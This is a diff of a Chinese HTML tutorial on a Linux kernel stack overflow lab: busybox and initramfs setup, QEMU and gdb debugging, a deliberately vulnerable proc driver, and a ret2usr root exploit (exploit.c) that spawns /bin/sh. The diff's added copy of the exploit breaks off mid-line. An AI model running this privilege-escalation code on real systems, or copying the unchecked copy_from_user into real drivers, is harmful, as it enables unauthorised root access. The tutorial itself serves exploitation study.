 <h4 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h4><p>一开始在Ubuntu 18.04上静态编译的时候，遇到libc版本的问题，在Linux Kernel启动的时候会提示<code>kernel too old</code>。在编译前需要使用以下指令检查下当前libc所支持的内核版本，如果所支持的版本过高，需要使用低版本libc。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file /path/to/libc-x.xx.so</span><br></pre></td></tr></table></figure>
+
 <p>需要将busybox的编译选项设置为静态编译。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
 <p>把生成的<code>_install</code>文件夹拷贝到linux kernel源代码根目录。</p>
 <h4 id="生成文件系统"><a href="#生成文件系统" class="headerlink" title="生成文件系统"></a>生成文件系统</h4><p>进入<code>_install</code>目录，创建文件夹</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir etc</span><br><span class="line">mkdir dev</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir -p etc/init.d/</span><br><span class="line">mkdir home</span><br><span class="line">mkdir root</span><br><span class="line">touch etc/passwd</span><br><span class="line">touch etc/group</span><br></pre></td></tr></table></figure>
+
 <p>创建etc/init.d/rcS文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /proc</span><br><span class="line">mkdir -p /tmp</span><br><span class="line">mkdir -p /sys</span><br><span class="line">mkdir -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line"># 在部分版本的kernel编译时，需要手动配置UEVENT_HELPER后再进行编译</span><br><span class="line">mdev -s</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /proc</span><br><span class="line">mkdir -p /tmp</span><br><span class="line">mkdir -p /sys</span><br><span class="line">mkdir -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line"># 在部分版本的kernel编译时，需要手动配置UEVENT_HELPER后再进行编译</span><br><span class="line">mdev -s</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x rcS</span><br></pre></td></tr></table></figure>
+
 <p>创建etc/fstab文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tmpfs /dev tmpfs defaults 0 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tmpfs /dev tmpfs defaults 0 0</span><br></pre></td></tr></table></figure>
+
 <p>创建etc/inittab文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br></pre></td></tr></table></figure>
+
 <p>在dev/创建设备节点</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mknod console c 5 1</span><br><span class="line">sudo mknod null c 1 3</span><br></pre></td></tr></table></figure>
+
 <p>创建文件系统，在<code>_install</code>文件夹中执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img</span><br></pre></td></tr></table></figure>
-<h4 id="QEMU启动Linux-Kernel"><a href="#QEMU启动Linux-Kernel" class="headerlink" title="QEMU启动Linux Kernel"></a>QEMU启动Linux Kernel</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append <span class="string">"rdinit=/linuxrc"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="QEMU启动Linux-Kernel"><a href="#QEMU启动Linux-Kernel" class="headerlink" title="QEMU启动Linux Kernel"></a>QEMU启动Linux Kernel</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append <span class="string">&quot;rdinit=/linuxrc&quot;</span></span><br></pre></td></tr></table></figure>
+
 <h4 id="使用deboostrap创建文件系统"><a href="#使用deboostrap创建文件系统" class="headerlink" title="使用deboostrap创建文件系统"></a>使用deboostrap创建文件系统</h4><p>使用deboostrap需要<strong>良好的网络环境</strong>支持。</p>
 <h4 id="GDB-Patch"><a href="#GDB-Patch" class="headerlink" title="GDB Patch"></a>GDB Patch</h4><p>使用gdb调试的时候，会出现<code>g pack too long</code>的报错，可通过网上的方法解决（修改gdb源码并重新编译），虽然能够正常调试，但首次attach上无法正常显示pwngdb等插件的界面，退出再重新attach即可（QEMU使用选项-S和-s）。</p>
 <h4 id="编译特定内核版本的驱动"><a href="#编译特定内核版本的驱动" class="headerlink" title="编译特定内核版本的驱动"></a>编译特定内核版本的驱动</h4><p>在Makefile中指定根目录即可</p>
 <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROOTDIR := /path/to/kernel/source</span><br></pre></td></tr></table></figure>
+
 <p>在系统中加载驱动后，会被挂载在sys目录下而不是dev目录。</p>
 <h3 id="基本内核栈溢出漏洞调试"><a href="#基本内核栈溢出漏洞调试" class="headerlink" title="基本内核栈溢出漏洞调试"></a>基本内核栈溢出漏洞调试</h3><h4 id="简单内核栈溢出示例"><a href="#简单内核栈溢出示例" class="headerlink" title="简单内核栈溢出示例"></a>简单内核栈溢出示例</h4><p>使用</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append "rdinit=/linuxrc" -S -s</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append &quot;rdinit=/linuxrc&quot; -S -s</span><br></pre></td></tr></table></figure>
+
 <p>启动内核并使用gdb进行调试。</p>
 <p>示例驱动源代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_file_entry</span>;</span></span><br><span class="line"><span class="keyword">uint64_t</span> rbx, rbp;</span><br><span class="line"><span class="comment">// Buggy write handling</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buggy_write</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">const</span> <span class="keyword">char</span> *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">8</span>];</span><br><span class="line">	copy_from_user(data, buf, len);</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">buggy_proc_fops</span> = &#123;</span></span><br><span class="line">	.write = buggy_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	printk(<span class="string">" module started\n"</span>);</span><br><span class="line">	printk(<span class="string">" creating proc entry @ /proc/buggy\n"</span>);</span><br><span class="line"></span><br><span class="line">	proc_file_entry = proc_create(<span class="string">"buggy"</span>, <span class="number">0666</span>, <span class="literal">NULL</span>, &amp;buggy_proc_fops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	remove_proc_entry(<span class="string">"buggy"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_file_entry</span>;</span></span><br><span class="line"><span class="keyword">uint64_t</span> rbx, rbp;</span><br><span class="line"><span class="comment">// Buggy write handling</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buggy_write</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">const</span> <span class="keyword">char</span> *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">8</span>];</span><br><span class="line">	copy_from_user(data, buf, len);</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">buggy_proc_fops</span> = &#123;</span></span><br><span class="line">	.write = buggy_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	printk(<span class="string">&quot; module started\n&quot;</span>);</span><br><span class="line">	printk(<span class="string">&quot; creating proc entry @ /proc/buggy\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	proc_file_entry = proc_create(<span class="string">&quot;buggy&quot;</span>, <span class="number">0666</span>, <span class="literal">NULL</span>, &amp;buggy_proc_fops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	remove_proc_entry(<span class="string">&quot;buggy&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>Makefile：</p>
 <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">obj-m := sbof.o</span><br><span class="line">ROOTDIR  := /path/to/linux/src</span><br><span class="line">PWD   := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(ROOTDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line">	<span class="variable">$(CC)</span> --static -o exploit exploit.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(ROOTDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line">	rm exploit</span><br></pre></td></tr></table></figure>
+
 <p>exploit.c：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">char</span> ownstack[STACK_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fake_frame</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>		*rip;   <span class="comment">/* shell() */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	cs;     <span class="comment">/* %cs */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	rflags; <span class="comment">/* rflags */</span></span><br><span class="line">	<span class="keyword">void</span>		*rsp;   <span class="comment">/* %rsp */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	ss;     <span class="comment">/* %ss */</span></span><br><span class="line">&#125; __attribute__( (packed) ) ff;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__( (regparm( 3 ) ) )</span></span><br><span class="line"><span class="keyword">void</span>	* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL	= (<span class="keyword">void</span> *) <span class="number">0xffffffff8105d4e9</span>;</span><br><span class="line"><span class="keyword">void</span>	* (*commit_creds)(<span class="keyword">void</span> *) KERNCALL		= (<span class="keyword">void</span> *) <span class="number">0xffffffff8105d5c7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	execl( <span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="number">0</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	commit_creds( prepare_kernel_cred( <span class="number">0</span> ) );</span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">"mov $ff, %rsp;\n"</span></span><br><span class="line">	     <span class="string">"swapgs;\n"</span></span><br><span class="line">	     <span class="string">"iretq;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_ff</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">"xorq %rax, %rax;\n"</span></span><br><span class="line">	     <span class="string">"movw %cs, %ax;\n"</span></span><br><span class="line">	     <span class="string">"movq %rax, ff+8;\n"</span></span><br><span class="line">	     <span class="string">"pushfq;   popq ff+16;\n"</span></span><br><span class="line">	     <span class="string">"movw %ss, %ax;\n"</span></span><br><span class="line">	     <span class="string">"movq %rax, ff+32;\n"</span>);</span><br><span class="line">	ff.rip	= &amp;shell;</span><br><span class="line">	ff.rsp	= ownstack + (STACK_SIZE / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE	*fd;</span><br><span class="line">	<span class="keyword">char</span>	buf[<span class="number">8</span> * <span class="number">6</span>];</span><br><span class="line">	<span class="built_in">memset</span>( buf, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(buf) );</span><br><span class="line">	*( (<span class="keyword">void</span> * *) (buf + <span class="number">8</span> * <span class="number">4</span>) ) = &amp;payload;</span><br><span class="line">	<span class="keyword">int</span>		ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	addr;</span><br><span class="line">	<span class="keyword">char</span>		dummy;</span><br><span class="line">	<span class="keyword">char</span>		sname[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* setup fake frame */</span></span><br><span class="line">	<span class="built_in">fprintf</span>( <span class="built_in">stdout</span>, <span class="string">"[+] preparing fake frame"</span> );</span><br><span class="line">	setup_ff();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* write payload */</span></span><br><span class="line">	<span class="built_in">fprintf</span>( <span class="built_in">stdout</span>, <span class="string">"[+] writing payload to /proc/buggy"</span> );</span><br><span class="line">	fd = fopen( <span class="string">"/proc/buggy"</span>, <span class="string">"w"</span> );</span><br><span class="line">	<span class="keyword">if</span> ( fd == <span class="literal">NULL</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		perror( <span class="string">"fopen()"</span> );</span><br><span class="line">		<span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite( buf, <span class="keyword">sizeof</span>(buf), <span class="number">1</span>, fd );</span><br><span class="line">	fclose( fd );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">char</span> ownstack[STACK_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fake_frame</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>		*rip;   <span class="comment">/* shell() */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	cs;     <span class="comment">/* %cs */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	rflags; <span class="comment">/* rflags */</span></span><br><span class="line">	<span class="keyword">void</span>		*rsp;   <span class="comment">/* %rsp */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	ss;     <span class="comment">/* %ss */</span></span><br><span class="line">&#125; __attribute__( (packed) ) ff;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__( (regparm( 3 ) ) )</span></span><br><span class="line"><span class="keyword">void</span>	* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL	= (<span class="keyword">void</span> *) <span class="number">0xffffffff8105d4e9</span>;</span><br><span class="line"><span class="keyword">void</span>	* (*commit_creds)(<span class="keyword">void</span> *) KERNCALL		= (<span class="keyword">void</span> *) <span class="number">0xffffffff8105d5c7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	execl( <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="number">0</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 